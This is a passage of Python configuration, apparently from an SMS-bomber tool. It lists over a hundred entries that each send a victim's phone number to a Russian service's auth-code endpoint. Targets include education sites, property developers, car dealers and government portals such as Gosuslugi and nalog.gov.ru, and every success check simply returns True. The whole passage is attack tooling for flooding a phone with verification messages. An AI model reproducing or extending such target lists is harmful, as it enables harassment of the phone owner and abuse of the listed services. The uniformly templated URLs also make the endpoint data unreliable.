        "headers": lambda: get_common_headers("https://incamp.ru/", "https://incamp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1064": {
        "name": "DetiCamp",
        "url": "https://deticamp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://deticamp.ru/", "https://deticamp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1065": {
        "name": "SportCamp",
        "url": "https://sportcamp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sportcamp.ru/", "https://sportcamp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1066": {
        "name": "EnglishCamp",
        "url": "https://englishcamp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://englishcamp.ru/", "https://englishcamp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1067": {
        "name": "LanguageLink",
        "url": "https://languagelink.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://languagelink.ru/", "https://languagelink.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1068": {
        "name": "BKC_IH",
        "url": "https://bkc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bkc.ru/", "https://bkc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1069": {
        "name": "Novator",
        "url": "https://novator.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novator.ru/", "https://novator.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1070": {
        "name": "Skillbox",
        "url": "https://skillbox.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skillbox.ru/", "https://skillbox.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1071": {
        "name": "GeekBrains",
        "url": "https://geekbrains.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://geekbrains.ru/", "https://geekbrains.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1072": {
        "name": "Netology",
        "url": "https://netology.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://netology.ru/", "https://netology.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1073": {
        "name": "Stepik",
        "url": "https://stepik.org/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stepik.org/", "https://stepik.org", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1074": {
        "name": "Coursera",
        "url": "https://coursera.org/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coursera.org/", "https://coursera.org", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1075": {
        "name": "Udemy",
        "url": "https://udemy.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://udemy.com/", "https://udemy.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1076": {
        "name": "SkillFactory",
        "url": "https://skillfactory.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skillfactory.ru/", "https://skillfactory.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1077": {
        "name": "Contented",
        "url": "https://contented.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://contented.ru/", "https://contented.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1078": {
        "name": "ProductStar",
        "url": "https://productstar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://productstar.ru/", "https://productstar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1079": {
        "name": "Hexlet",
        "url": "https://hexlet.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hexlet.io/", "https://hexlet.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1080": {
        "name": "HTMLAcademy",
        "url": "https://htmlacademy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://htmlacademy.ru/", "https://htmlacademy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1081": {
        "name": "Otus",
        "url": "https://otus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://otus.ru/", "https://otus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1082": {
        "name": "SingularityApp",
        "url": "https://singularity-app.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://singularity-app.com/", "https://singularity-app.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1083": {
        "name": "Planer",
        "url": "https://planer.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://planer.ru/", "https://planer.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1084": {
        "name": "LeaderTask",
        "url": "https://leadertask.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://leadertask.ru/", "https://leadertask.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1085": {
        "name": "MegaPlan",
        "url": "https://megaplan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megaplan.ru/", "https://megaplan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1086": {
        "name": "AmoCRM",
        "url": "https://amocrm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://amocrm.ru/", "https://amocrm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1087": {
        "name": "Bitrix24",
        "url": "https://bitrix24.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitrix24.ru/", "https://bitrix24.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1088": {
        "name": "RetailCRM",
        "url": "https://retailcrm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://retailcrm.ru/", "https://retailcrm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1089": {
        "name": "YClients",
        "url": "https://yclients.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yclients.com/", "https://yclients.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1090": {
        "name": "ProfiRu",
        "url": "https://profi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://profi.ru/", "https://profi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1091": {
        "name": "YouDo",
        "url": "https://youdo.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youdo.com/", "https://youdo.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1092": {
        "name": "Avito",
        "url": "https://avito.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avito.ru/", "https://avito.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1093": {
        "name": "Cian",
        "url": "https://cian.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cian.ru/", "https://cian.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1094": {
        "name": "DomClick",
        "url": "https://domclick.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domclick.ru/", "https://domclick.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1095": {
        "name": "Etagi",
        "url": "https://etagi.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etagi.com/", "https://etagi.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1096": {
        "name": "Pik",
        "url": "https://pik.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pik.ru/", "https://pik.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1097": {
        "name": "Samolet",
        "url": "https://samolet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://samolet.ru/", "https://samolet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1098": {
        "name": "LSR",
        "url": "https://lsr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lsr.ru/", "https://lsr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1099": {
        "name": "SetlGroup",
        "url": "https://setlgroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://setlgroup.ru/", "https://setlgroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1100": {
        "name": "Ingrad",
        "url": "https://ingrad.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ingrad.ru/", "https://ingrad.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1101": {
        "name": "Donstroy",
        "url": "https://donstroy.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://donstroy.com/", "https://donstroy.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1102": {
        "name": "A101",
        "url": "https://a101.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://a101.ru/", "https://a101.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1103": {
        "name": "Etalon",
        "url": "https://etalon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etalon.ru/", "https://etalon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1104": {
        "name": "MR_Group",
        "url": "https://mr-group.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mr-group.ru/", "https://mr-group.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1105": {
        "name": "LeaderInvest",
        "url": "https://leader-invest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://leader-invest.ru/", "https://leader-invest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1106": {
        "name": "Glorax",
        "url": "https://glorax.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://glorax.com/", "https://glorax.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1107": {
        "name": "Sminex",
        "url": "https://sminex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sminex.com/", "https://sminex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1108": {
        "name": "CapitalGroup",
        "url": "https://capitalgroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://capitalgroup.ru/", "https://capitalgroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1109": {
        "name": "Vesper",
        "url": "https://vesper.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vesper.com/", "https://vesper.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1110": {
        "name": "Barkli",
        "url": "https://barkli.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://barkli.ru/", "https://barkli.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1111": {
        "name": "LevelGroup",
        "url": "https://level.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://level.ru/", "https://level.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1112": {
        "name": "Kortros",
        "url": "https://kortros.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kortros.ru/", "https://kortros.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1113": {
        "name": "ForteGroup",
        "url": "https://fortegroup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fortegroup.ru/", "https://fortegroup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1114": {
        "name": "Accent",
        "url": "https://accent.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://accent.ru/", "https://accent.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1115": {
        "name": "Insigma",
        "url": "https://insigma.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://insigma.ru/", "https://insigma.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1116": {
        "name": "Antteq",
        "url": "https://antteq.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://antteq.com/", "https://antteq.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1117": {
        "name": "RenaissanceConstruction",
        "url": "https://rencons.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rencons.com/", "https://rencons.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1118": {
        "name": "Enka",
        "url": "https://enka.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://enka.com/", "https://enka.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1119": {
        "name": "MirLand",
        "url": "https://mirland-development.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mirland-development.com/", "https://mirland-development.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1120": {
        "name": "Mivo",
        "url": "https://mivo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mivo.ru/", "https://mivo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1121": {
        "name": "Avtodom",
        "url": "https://avtodom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtodom.ru/", "https://avtodom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1122": {
        "name": "MajorAuto",
        "url": "https://major-auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://major-auto.ru/", "https://major-auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1123": {
        "name": "Rolf",
        "url": "https://rolf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rolf.ru/", "https://rolf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1124": {
        "name": "FavoritMotors",
        "url": "https://favorit-motors.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://favorit-motors.ru/", "https://favorit-motors.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1125": {
        "name": "Panavto",
        "url": "https://panavto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://panavto.ru/", "https://panavto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1126": {
        "name": "Avilon",
        "url": "https://avilon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avilon.ru/", "https://avilon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1127": {
        "name": "Genser",
        "url": "https://genser.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://genser.ru/", "https://genser.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1128": {
        "name": "Musings",
        "url": "https://musings.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://musings.ru/", "https://musings.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1129": {
        "name": "Klyavto",
        "url": "https://klyavto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://klyavto.ru/", "https://klyavto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1130": {
        "name": "Transtechservice",
        "url": "https://tts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tts.ru/", "https://tts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1131": {
        "name": "Expocar",
        "url": "https://expocar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://expocar.ru/", "https://expocar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1132": {
        "name": "AutoSpetzteh",
        "url": "https://autospetzteh.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autospetzteh.ru/", "https://autospetzteh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1133": {
        "name": "LadaRu",
        "url": "https://lada.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lada.ru/", "https://lada.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1134": {
        "name": "Kamaz",
        "url": "https://kamaz.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kamaz.ru/", "https://kamaz.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1135": {
        "name": "Uaz",
        "url": "https://uaz.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uaz.ru/", "https://uaz.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1136": {
        "name": "Gaz",
        "url": "https://gaz.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gaz.ru/", "https://gaz.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1137": {
        "name": "Moskvich",
        "url": "https://moskvich-auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://moskvich-auto.ru/", "https://moskvich-auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1138": {
        "name": "Aurus",
        "url": "https://aurusmotors.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aurusmotors.com/", "https://aurusmotors.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1139": {
        "name": "HavalRu",
        "url": "https://haval.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://haval.ru/", "https://haval.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1140": {
        "name": "CheryRu",
        "url": "https://chery.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chery.ru/", "https://chery.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1141": {
        "name": "GeelyRu",
        "url": "https://geely-motors.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://geely-motors.com/", "https://geely-motors.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1142": {
        "name": "ExeedRu",
        "url": "https://exeed.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://exeed.ru/", "https://exeed.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1143": {
        "name": "OmodaRu",
        "url": "https://omoda.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://omoda.ru/", "https://omoda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1144": {
        "name": "TankRu",
        "url": "https://tank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tank.ru/", "https://tank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1145": {
        "name": "Jaecco",
        "url": "https://jaecoo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jaecoo.ru/", "https://jaecoo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1146": {
        "name": "Jetour",
        "url": "https://jetour-ru.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jetour-ru.com/", "https://jetour-ru.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1147": {
        "name": "Baic",
        "url": "https://baic-auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://baic-auto.ru/", "https://baic-auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1148": {
        "name": "Kaiyi",
        "url": "https://kaiyi-auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kaiyi-auto.ru/", "https://kaiyi-auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1149": {
        "name": "SWM",
        "url": "https://swm-motor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://swm-motor.ru/", "https://swm-motor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1150": {
        "name": "Tenex",
        "url": "https://tenex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tenex.ru/", "https://tenex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1151": {
        "name": "Autoru",
        "url": "https://auto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://auto.ru/", "https://auto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1152": {
        "name": "Drom",
        "url": "https://drom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://drom.ru/", "https://drom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1153": {
        "name": "Am.ru",
        "url": "https://am.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://am.ru/", "https://am.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1154": {
        "name": "Bibika",
        "url": "https://bibika.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bibika.ru/", "https://bibika.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1155": {
        "name": "WheelsRu",
        "url": "https://kolesa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kolesa.ru/", "https://kolesa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1156": {
        "name": "Zru",
        "url": "https://zr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zr.ru/", "https://zr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1157": {
        "name": "Autoreview",
        "url": "https://autoreview.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autoreview.ru/", "https://autoreview.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1158": {
        "name": "MotorRu",
        "url": "https://motor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://motor.ru/", "https://motor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1159": {
        "name": "Autonews",
        "url": "https://autonews.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autonews.ru/", "https://autonews.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1160": {
        "name": "Quto",
        "url": "https://quto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://quto.ru/", "https://quto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1161": {
        "name": "Avtotok",
        "url": "https://avtotok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtotok.ru/", "https://avtotok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1162": {
        "name": "Autodoc",
        "url": "https://autodoc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autodoc.ru/", "https://autodoc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1163": {
        "name": "Exist",
        "url": "https://exist.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://exist.ru/", "https://exist.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1164": {
        "name": "Emex",
        "url": "https://emex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://emex.ru/", "https://emex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1165": {
        "name": "Autopiter",
        "url": "https://autopiter.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://autopiter.ru/", "https://autopiter.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1166": {
        "name": "FormulaDorog",
        "url": "https://formula-dorog.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://formula-dorog.ru/", "https://formula-dorog.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1167": {
        "name": "KolesoRu",
        "url": "https://koleso.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://koleso.ru/", "https://koleso.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1168": {
        "name": "ShinaRu",
        "url": "https://shina.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shina.ru/", "https://shina.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1169": {
        "name": "Mosavtoshina",
        "url": "https://mosautoshina.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mosautoshina.ru/", "https://mosautoshina.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1170": {
        "name": "4tochki",
        "url": "https://4tochki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://4tochki.ru/", "https://4tochki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1171": {
        "name": "Avtodispetcher",
        "url": "https://avtodispetcher.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtodispetcher.ru/", "https://avtodispetcher.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1172": {
        "name": "Autodor",
        "url": "https://avtodor-tr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtodor-tr.ru/", "https://avtodor-tr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1173": {
        "name": "Rosavtodor",
        "url": "https://rosavtodor.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosavtodor.gov.ru/", "https://rosavtodor.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1174": {
        "name": "GIBDD",
        "url": "https://gibdd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gibdd.ru/", "https://gibdd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1175": {
        "name": "Gosuslugi",
        "url": "https://gosuslugi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gosuslugi.ru/", "https://gosuslugi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1176": {
        "name": "MosRu",
        "url": "https://mos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mos.ru/", "https://mos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1177": {
        "name": "NALOG",
        "url": "https://nalog.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nalog.gov.ru/", "https://nalog.gov.ru", "application/json"),
